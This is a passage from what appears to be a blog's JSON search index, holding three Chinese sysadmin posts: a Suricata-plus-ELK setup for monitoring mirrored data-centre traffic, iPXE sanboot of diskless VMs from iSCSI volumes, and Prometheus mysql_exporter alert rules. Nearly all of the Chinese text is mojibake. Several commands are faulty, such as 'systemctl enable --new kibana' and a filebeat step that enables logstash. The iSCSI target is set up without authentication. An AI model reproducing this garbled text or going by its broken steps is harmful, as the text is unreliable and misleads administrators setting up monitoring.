ã€å¤šçº¿ç¨‹ä¸‹è½½çš„è½¯ä»¶"},{"content":"suricata æ˜¯è·Ÿsnortå·®ä¸å¤šçš„ä¸€ä¸ªå…¥ä¾µæ£€æµ‹å·¥å…·ï¼ŒåŠ ä¸Šelkçš„å›¾å½¢ç•Œé¢ï¼Œéå¸¸çš„å¥½çœ‹ã€‚\nåŸç†æ˜¯suricataçš„logå‘åˆ°elké‡Œï¼Œè¿™æ ·å°±èƒ½é€šè¿‡kibanaè¿›è¡Œåˆ†æäº†\nç¯å¢ƒï¼š\n1ã€ç‰©ç†æœºéœ€è¦å¼€16Gå†…å­˜ï¼Œ16CPUï¼Œéƒ½ä¸å¤ªå¤Ÿ 2ã€ç‰©ç†æœº172.18.30.2çš„br3æ˜¯äº¤æ¢æœºçš„Mirrorå£ï¼Œè¿›å…¥çš„å…¨éƒ¨æµé‡éƒ½è¢«é•œåƒäº†ä¸€ä»½ 3ã€suricata-18-31-31æ˜¯è™šæœºï¼Œéœ€è¦å°†30.2çš„br3æŒ‚è¿›æ¥\nvirsh attach-interface --domain suricata-18-31-31 --type bridge --source br3 --model e1000 --config --live åŒæ—¶åœ¨31.31é‡Œï¼Œifconfig up eth1æŠŠç½‘å¡èµ·èµ·æ¥ tcpdump -i eth1æœ‰æ•°æ®å³å¯ 4ã€é¦–å…ˆå®‰è£…java\nrpm -ivh jdk-8u201-linux-x64.rpm å®‰è£…ï¼š ä¸€ã€ç¼–è¯‘å®‰è£…suricata\nyum -y install epel-release yum -y install jq cargo openssl-devel PyYAML lz4-devel gcc libpcap-devel pcre-devel libyaml-devel file-devel zlib-devel jansson-devel nss-devel libcap-ng-devel libnet-devel tar make libnetfilter_queue-devel lua-devel GeoIP-devel wget https://www.openinfosecfoundation.org/download/suricata-4.1.8.tar.gz tar zxvf suricata-4.1.8.tar.gz cd suricata ./configure --libdir=/usr/lib64 --prefix=/usr --sysconfdir=/etc --localstatedir=/var --enable-nfqueue --enable-lua --enable-geoip --enable-profiling make make install-full éªŒè¯ä¸€ä¸‹ suricata -V This is Suricata version 4.1.8 RELEASE æŸ¥çœ‹buildå‚æ•° suricata --build-info suricataå°±è£…å¥½äº†ï¼Œè¿˜éœ€è¦é…ä¸€ä¸‹suricata-updateï¼Œè§„åˆ™æ‰æ˜¯æœ€ä¸»è¦çš„ï¼Œè£…å¥½åæœ€å¥½æ¯å¤©æ›´æ–°ä¸€ä¸‹è§„åˆ™\nsuricata-update update-sources suricata-update list-sources suricata-update enable-source ptresearch/attackdetection suricata-update enable-source oisf/trafficid suricata-update enable-source sslbl/ssl-fp-blacklist suricata-update suricata-updateçš„ç”¨æ³•\nsuricata-update list-enabled-sources suricata-update disable-source et/pro suricata-update remove-source et/pro æµ‹è¯•è§„åˆ™ï¼š\nsuricata -T /etc/suricata/suricata.yamlçš„ä¿®æ”¹éƒ¨åˆ†\nHOME_NET: \u0026#34;[43.231.149.0/25]\u0026#34; outputsè¢«æ”¹è¿‡ outputs: app-layerè¢«æ”¹è¿‡ app-layer: å…·ä½“çœ‹é™„ä»¶ä¸­çš„suricata.yaml\nå¯åŠ¨ï¼š\n/usr/bin/suricata -c /etc/suricata/suricata.yaml -i eth1 -D äºŒã€ç¼–è¯‘å®‰è£…ELK\nrpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch cat \u0026lt;\u0026lt;EOF | sudo tee /etc/yum.repos.d/elasticsearch.repo [elasticsearch-7.x] name=Elasticsearch repository for 7.x packages baseurl=https://artifacts.elastic.co/packages/7.x/yum gpgcheck=1 gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch enabled=1 autorefresh=1 type=rpm-md EOF yum clean all yum makecache yum install -y elasticsearch logstash kibana filebeat å®‰è£…çš„æ—¶å€™æœ€å¥½è®¾ä¸€ä¸‹ç¿»å¢™ï¼Œå¦åˆ™ä¸‹è¿™å‡ ä¸ªåŒ…éå¸¸æ…¢ï¼ï¼ï¼\nç„¶åä¸€ä¸ªä¸€ä¸ªæ¥è®¾ç½®\n1ã€è®¾ç½®elasticsearch vi /etc/elasticsearch/jvm.options -Xms4g -Xmx4g vi /etc/elasticsearch/elasticsearch.yml indices.query.bool.max_clause_count: 8192 search.max_buckets: 250000 systemctl enable --now elasticsearch 2ã€è®¾ç½®logstash å°†é™„ä»¶ä¸­logstashç›®å½•ä¸‹çš„synlite_suricata/ç›®å½•å®Œæ•´æŒªåˆ°/etc/logstashä¸‹ /etc/logstash/synlite_suricata/ å°†é™„ä»¶ä¸­logstashç›®å½•ä¸‹çš„pipelines.ymlæ‹·è´åˆ°/etc/logstashä¸‹ /etc/logstash/pipelines.yml å°†é™„ä»¶ä¸­logstashç›®å½•ä¸‹çš„logstash.serviceæ‹·è´è¦†ç›–æ‰/etc/systemd/system/logstast.service /etc/systemd/system/logstash.service vi /etc/logstash/jvm.options -Xms4g -Xmx4g systemctl daemon-reload systemctl enable --now logstash 3ã€è®¾ç½®filebeat vi /etc/filebeat/filebeat.yml filebeat.inputs: - type: log enabled: true paths: - /var/log/suricata/eve.json fields: event.type: suricata output.logstash: hosts: [\u0026#34;127.0.0.1:5044\u0026#34;] #ssl.certificate_authorities: [\u0026#34;/etc/pki/root/ca.pem\u0026#34;] #ssl.certificate: \u0026#34;/etc/pki/client/cert.pem\u0026#34; #ssl.key: \u0026#34;/etc/pki/client/cert.key\u0026#34; systemctl enable --now logstash 4ã€è®¾ç½®kibana vi /etc/kibana/kibana.yml server.host: \u0026#34;172.18.31.31\u0026#34; systemctl enable --new kibana è·‘èµ·æ¥ä»¥åæ‰“å¼€ http://172.18.31.31:5601 å°±å¯ä»¥çœ‹åˆ°äº†\nå¦‚æœä¸å‡ºæ„å¤–ï¼Œåº”è¯¥æœ‰æ•°æ®äº†ã€‚éœ€è¦å»ºç«‹ä¸€ä¸ªsuricata*çš„ç´¢å¼•ã€‚\nå»kibanaçš„home \u0026ndash;\u0026gt; Stack Management\nå¯¼å…¥çš„synlite_suricata.kibana.7.1.x.json\nhttps://github.com/robcowart/synesis_lite_suricata/blob/master/kibana/synlite_suricata.kibana.7.1.x.json\nç„¶ååœ¨dashboardé‡Œå°±å¯ä»¥çœ‹åˆ°äº†\nå¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°å„ç§ipflowï¼Œæµé‡åˆ†å¸ƒã€‚\n","permalink":"https://rendoumi.com/posts/20231215-suricata_elk/","summary":"\u003cp\u003esuricata æ˜¯è·Ÿsnortå·®ä¸å¤šçš„ä¸€ä¸ªå…¥ä¾µæ£€æµ‹å·¥å…·ï¼ŒåŠ ä¸Šelkçš„å›¾å½¢ç•Œé¢ï¼Œéå¸¸çš„å¥½çœ‹ã€‚\u003c/p\u003e\n\u003cp\u003eåŸç†æ˜¯suricataçš„logå‘åˆ°elké‡Œï¼Œè¿™æ ·å°±èƒ½é€šè¿‡kibanaè¿›è¡Œåˆ†æäº†\u003c/p\u003e\n\u003cp\u003eç¯å¢ƒï¼š\u003c/p\u003e\n\u003cp\u003e1ã€ç‰©ç†æœºéœ€è¦å¼€16Gå†…å­˜ï¼Œ16CPUï¼Œéƒ½ä¸å¤ªå¤Ÿ\n2ã€ç‰©ç†æœº172.18.30.2çš„br3æ˜¯äº¤æ¢æœºçš„Mirrorå£ï¼Œè¿›å…¥çš„å…¨éƒ¨æµé‡éƒ½è¢«é•œåƒäº†ä¸€ä»½\n3ã€suricata-18-31-31æ˜¯è™šæœºï¼Œéœ€è¦å°†30.2çš„br3æŒ‚è¿›æ¥\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh attach-interface  --domain suricata-18-31-31 --type bridge --source br3 --model e1000 --config --live\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eåŒæ—¶åœ¨31.31é‡Œï¼Œifconfig up eth1æŠŠç½‘å¡èµ·èµ·æ¥\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etcpdump -i eth1æœ‰æ•°æ®å³å¯\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e4ã€é¦–å…ˆå®‰è£…java\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erpm -ivh jdk-8u201-linux-x64.rpm\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå®‰è£…ï¼š\nä¸€ã€ç¼–è¯‘å®‰è£…suricata\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install epel-release\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install jq cargo openssl-devel PyYAML lz4-devel gcc libpcap-devel pcre-devel libyaml-devel file-devel zlib-devel jansson-devel nss-devel libcap-ng-devel libnet-devel tar make libnetfilter_queue-devel lua-devel GeoIP-devel\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://www.openinfosecfoundation.org/download/suricata-4.1.8.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf suricata-4.1.8.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e suricata\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./configure --libdir\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/lib64 --prefix\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr --sysconfdir\u003cspan class=\"o\"\u003e=\u003c/span\u003e/etc --localstatedir\u003cspan class=\"o\"\u003e=\u003c/span\u003e/var --enable-nfqueue --enable-lua --enable-geoip --enable-profiling\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake install-full\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eéªŒè¯ä¸€ä¸‹\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esuricata -V\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThis is Suricata version 4.1.8 RELEASE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eæŸ¥çœ‹buildå‚æ•°\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esuricata --build-info\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003esuricataå°±è£…å¥½äº†ï¼Œè¿˜éœ€è¦é…ä¸€ä¸‹suricata-updateï¼Œè§„åˆ™æ‰æ˜¯æœ€ä¸»è¦çš„ï¼Œè£…å¥½åæœ€å¥½æ¯å¤©æ›´æ–°ä¸€ä¸‹è§„åˆ™\u003c/p\u003e","title":"suricataåŠ ä¸Šelkåˆ†ææœºæˆ¿å…¥å£å…¨æµé‡"},{"content":"å¦‚æœä¸€å°å®¿ä¸»æœºä¸Šé¢cpuå’Œmemoryéƒ½æœ‰å¯Œè£•ï¼Œä½†æ˜¯ç£ç›˜ä¸å¯Œè£•ï¼Œé‚£å°±ä¼šé¢ä¸´èµ„æºæµªè´¹\næ‰€ä»¥å¹²è„†ç”¨ipxeçš„sanbootæ¥å¯åŠ¨è¿œç¨‹çš„iscsiç£ç›˜æ¥å¯åŠ¨è™šæœºå¥½äº†\né¦–å…ˆç”¨ã€Šiscsiå·çš„è¿œç¨‹æŒ‚è½½ã€‹è¿™ç¯‡æ–‡ç« ä¸­æ‰€è¯´çš„æ–¹æ³•ï¼Œåœ¨172.18.30.18çš„20Tçš„loopback vg groupä¸Šï¼Œåˆ’å‡ºä¸€å—80Gçš„ç¡¬ç›˜\n#åˆ’ä¸ªlvcï¼Œç”¨çš„æ˜¯vg-targetdçš„20Tä¸­çš„80G lvcreate -L 80G -n pvc-vis-18-31-48 vg-targetd #å»ºç«‹blockå—è®¾å¤‡ targetcli /backstores/block create vg-targetd:pvc-vis-18-31-48 /dev/vg-targetd/pvc-vis-18-31-48 #å»ºç«‹30.18ä¸Šçš„iscsiæœåŠ¡ç«¯ï¼Œä¼¼ä¹ç”¨renhe-18-30-18æ¯”è¾ƒå¥½ï¼Œä½†æ˜¯ä¸å¥½åŒºåˆ†å¤šä¸ªå·ï¼Œè¿˜æ˜¯ç”¨ä¸‹é¢çš„ç²¾å‡† targetcli /iscsi create iqn.2020-10.com.ddky:vis-18-31-48 #å»ºç«‹lunsï¼Œä¼šè‡ªåŠ¨å»ºç«‹portal targetcli /iscsi/iqn.2020-10.com.ddky:vis-18-31-48/tpg1/luns create /backstores/block/vg-targetd:pvc-vis-18-31-48 #å»ºç«‹å®¢æˆ·ç«¯çš„iscsiï¼Œä¸åŠ ä»»ä½•è®¤è¯ targetcli /iscsi/iqn.2020-10.com.ddky:vis-18-31-48/tpg1/acls create iqn.2020-10.com.ddky:vis-18-31-48 è®°ä¸‹æ¥è¿™ä¸ª: iqn.2020-10.com.ddky:vis-18-31-48\nç„¶åä¿®æ”¹pxeï¼Œä½äº172.18.31.2 /export/html/pxeboot/boot2.phpï¼Œæœ¬è´¨æ˜¯å‘é€ipxeçš„å‘½ä»¤\nsanhookæ˜¯åŠ è½½è¿œç¨‹ç¡¬ç›˜ï¼Œå¹¶è®¾ç½®ä¸º/dev/sda\nfunction sansetup() { global $hostname; echo \u0026#34;:sansetup\\n\u0026#34;; echo \u0026#34;set initiator-iqn iqn.2020-10.com.ddky:vis-18-31-48\\n\u0026#34;; echo \u0026#34;set keep-san 1\\n\u0026#34;; echo \u0026#34;sanhook iscsi:172.18.30.18::::iqn.2020-10.com.ddky:vis-18-31-48\\n\u0026#34;; echo \u0026#34;kernel $hostname/repos/centos/7/os/x86_64/images/pxeboot/vmlinuz\\n\u0026#34;; echo \u0026#34;initrd $hostname/repos/centos/7/os/x86_64/images/pxeboot/initrd.img\\n\u0026#34;; echo \u0026#34;imgargs vmlinuz load_ramdisk=1 ks=$hostname/pxeboot/install/centos/centos7_last.php ksdevice=eth0 net.ifnames=0 biosdevname=0\\n\u0026#34;; echo \u0026#34;boot\\n\u0026#34;; } å‘åŠ¨ä¸€ä¸ªæ— ç›˜çš„è™šæœºä»pxeå¯åŠ¨ï¼ˆ172.18.30.3 /export/kvm/48.shï¼‰ï¼š\n#!/bin/bash virt-install \\ --name=pxe-18-31-48 \\ --vcpu=4 \\ --ram=4096 \\ --pxe \\ --disk none \\ --os-type=linux \\ --network bridge=br0.199 \\ --vnc --vnclisten=0.0.0.0 --vncport=5910 æ³¨æ„ä¸Šé¢ï¼šæŒ‡å®šäº†pxe å’Œdisk noneï¼Œè¿™æ ·å°±ä¼šå¯åŠ¨èµ·æ¥å¹¶å®‰è£…åˆ°è¿œç¨‹çš„iscsiç›˜ä¸Šå»\nå®‰è£…å®Œæˆåï¼Œä¿®æ”¹ipxeæŒ‡å®šè¯¥è™šæœºæœºä»sanbootå¯åŠ¨ï¼Œè¿™æ—¶å€™iscsiå·é‡Œå·²ç»æœ‰å¼•å¯¼ä¿¡æ¯äº†ï¼Œå°±éœ€è¦å»æ‰æŒ‡å®šã€‚\nfunction sanboot() { global $hostname; echo \u0026#34;:sanboot\\n\u0026#34;; echo \u0026#34;set initiator-iqn iqn.2020-10.com.ddky:vis-18-31-48\\n\u0026#34;; echo \u0026#34;set keep-san 1\\n\u0026#34;; echo \u0026#34;sanboot iscsi:172.18.30.18::::iqn.2020-10.com.ddky:vis-18-31-48\\n\u0026#34;; echo \u0026#34;boot\\n\u0026#34;; } é‡å¯åè¯¥æœºå™¨å°±ä¼šä»iscsiå¯åŠ¨äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20231215-pxe_sanboot/","summary":"\u003cp\u003eå¦‚æœä¸€å°å®¿ä¸»æœºä¸Šé¢cpuå’Œmemoryéƒ½æœ‰å¯Œè£•ï¼Œä½†æ˜¯ç£ç›˜ä¸å¯Œè£•ï¼Œé‚£å°±ä¼šé¢ä¸´èµ„æºæµªè´¹\u003c/p\u003e\n\u003cp\u003eæ‰€ä»¥å¹²è„†ç”¨ipxeçš„sanbootæ¥å¯åŠ¨è¿œç¨‹çš„iscsiç£ç›˜æ¥å¯åŠ¨è™šæœºå¥½äº†\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆç”¨ã€Š\u003ca href=\"https://bajie.dev/posts/20230801-iscsi_volume/\"\u003eiscsiå·çš„è¿œç¨‹æŒ‚è½½\u003c/a\u003eã€‹è¿™ç¯‡æ–‡ç« ä¸­æ‰€è¯´çš„æ–¹æ³•ï¼Œåœ¨172.18.30.18çš„20Tçš„loopback vg groupä¸Šï¼Œåˆ’å‡ºä¸€å—80Gçš„ç¡¬ç›˜\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#åˆ’ä¸ªlvcï¼Œç”¨çš„æ˜¯vg-targetdçš„20Tä¸­çš„80G\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elvcreate -L 80G -n pvc-vis-18-31-48 vg-targetd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å»ºç«‹blockå—è®¾å¤‡\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etargetcli /backstores/block create vg-targetd:pvc-vis-18-31-48 /dev/vg-targetd/pvc-vis-18-31-48\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å»ºç«‹30.18ä¸Šçš„iscsiæœåŠ¡ç«¯ï¼Œä¼¼ä¹ç”¨renhe-18-30-18æ¯”è¾ƒå¥½ï¼Œä½†æ˜¯ä¸å¥½åŒºåˆ†å¤šä¸ªå·ï¼Œè¿˜æ˜¯ç”¨ä¸‹é¢çš„ç²¾å‡†\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etargetcli /iscsi create iqn.2020-10.com.ddky:vis-18-31-48\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å»ºç«‹lunsï¼Œä¼šè‡ªåŠ¨å»ºç«‹portal\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etargetcli /iscsi/iqn.2020-10.com.ddky:vis-18-31-48/tpg1/luns create /backstores/block/vg-targetd:pvc-vis-18-31-48\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å»ºç«‹å®¢æˆ·ç«¯çš„iscsiï¼Œä¸åŠ ä»»ä½•è®¤è¯\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etargetcli /iscsi/iqn.2020-10.com.ddky:vis-18-31-48/tpg1/acls create iqn.2020-10.com.ddky:vis-18-31-48\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè®°ä¸‹æ¥è¿™ä¸ª:  iqn.2020-10.com.ddky:vis-18-31-48\u003c/p\u003e\n\u003cp\u003eç„¶åä¿®æ”¹pxeï¼Œä½äº172.18.31.2 /export/html/pxeboot/boot2.phpï¼Œæœ¬è´¨æ˜¯å‘é€ipxeçš„å‘½ä»¤\u003c/p\u003e\n\u003cp\u003esanhookæ˜¯åŠ è½½è¿œç¨‹ç¡¬ç›˜ï¼Œå¹¶è®¾ç½®ä¸º/dev/sda\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e sansetup\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    global \u003cspan class=\"nv\"\u003e$hostname\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;:sansetup\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set initiator-iqn iqn.2020-10.com.ddky:vis-18-31-48\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set keep-san 1\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;sanhook iscsi:172.18.30.18::::iqn.2020-10.com.ddky:vis-18-31-48\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;kernel \u003c/span\u003e\u003cspan class=\"nv\"\u003e$hostname\u003c/span\u003e\u003cspan class=\"s2\"\u003e/repos/centos/7/os/x86_64/images/pxeboot/vmlinuz\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;initrd \u003c/span\u003e\u003cspan class=\"nv\"\u003e$hostname\u003c/span\u003e\u003cspan class=\"s2\"\u003e/repos/centos/7/os/x86_64/images/pxeboot/initrd.img\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;imgargs vmlinuz load_ramdisk=1 ks=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$hostname\u003c/span\u003e\u003cspan class=\"s2\"\u003e/pxeboot/install/centos/centos7_last.php ksdevice=eth0 net.ifnames=0 biosdevname=0\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;boot\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå‘åŠ¨ä¸€ä¸ªæ— ç›˜çš„è™šæœºä»pxeå¯åŠ¨ï¼ˆ172.18.30.3 /export/kvm/48.shï¼‰ï¼š\u003c/p\u003e","title":"ipxeä½¿ç”¨sanbootè¿œç¨‹å¯åŠ¨iscsiç¡¬ç›˜"},{"content":"mysql_exporter å…¶å®æ˜¯ä¸€ä¸ªmysqlå®¢æˆ·ç«¯ï¼Œå®šæ—¶æ”¶é›†æœ¬æœºmysqlçš„æ•°æ®ï¼Œå¹¶æš´éœ²å‡ºä¸€ä¸ªwebç«¯å£å±•ç°æ•°æ®ã€‚\nä¾‹å¦‚ï¼šhttp://172.18.20.9:50001/metrics ï¼Œè¿™é‡Œæˆ‘ä»¬æš´éœ²çš„ç«¯å£æ˜¯50001ã€‚\nprometheus æ¯éš”5åˆ†é’Ÿä¼šè®¿é—®è¿™ä¸ªwebé¡µé¢ï¼ŒæŠŠä¸Šé¢çš„æ•°æ®æŠ“ä¸‹æ¥å…¥åº“ã€‚ï¼ˆæ—¶é—´é—´éš”å¯ä»¥è°ƒæ•´ï¼‰\næˆ‘ä»¬ç‚¹è¿›Prometheusçš„é¡µé¢ï¼š\næ³¨æ„å³ä¸‹è§’çš„æ—¶é—´æˆ³æ˜¯ä¸å¯¹çš„ï¼Œå·®8å°æ—¶ï¼Œæˆ‘ä»¬ç‚¹å³ä¸Šè§’çš„React UI è¿™ä¸ªUIæ—¶é—´æ˜¯å¯¹çš„ï¼Œè·Ÿå½“åœ°æ—¶é—´ä¸€è‡´ï¼š æƒ³çœ‹ mysql çš„æŒ‡æ ‡ï¼Œå°±éœ€è¦ç¼–è¾‘å…¬å¼ï¼Œè¾“å…¥mysqlä¼šæ˜¾ç¤ºæ‰€æœ‰mysqlçš„å…¬å¼ï¼š æ³¨æ„ï¼šæˆ‘ä»¬ mysql_exporter çš„ç«¯å£æ˜¯50001 ï¼Œ å†™ promsql é€‰æ‹©instanceçš„æ—¶å€™æ˜¯è¿™æ ·çš„instance=\u0026ldquo;172.18.20.9:50001\u0026rdquo;\nç»™ä¸€äº›æŠ¥è­¦ä¾‹å­ï¼š\nrate(mysql_global_status_threads_connected[5m]) \u0026gt; 200\rmysql_global_variables_max_connections - mysql_global_status_threads_connected \u0026lt; 500\rmysql_global_status_innodb_num_open_files \u0026gt; (mysql_global_variables_open_files_limit) * 0.75 ","permalink":"https://rendoumi.com/posts/20231215-prometheus_mysql/","summary":"\u003cp\u003emysql_exporter å…¶å®æ˜¯ä¸€ä¸ªmysqlå®¢æˆ·ç«¯ï¼Œå®šæ—¶æ”¶é›†æœ¬æœºmysqlçš„æ•°æ®ï¼Œå¹¶æš´éœ²å‡ºä¸€ä¸ªwebç«¯å£å±•ç°æ•°æ®ã€‚\u003c/p\u003e\n\u003cp\u003eä¾‹å¦‚ï¼šhttp://172.18.20.9:50001/metrics ï¼Œè¿™é‡Œæˆ‘ä»¬æš´éœ²çš„ç«¯å£æ˜¯50001ã€‚\u003c/p\u003e\n\u003cp\u003eprometheus 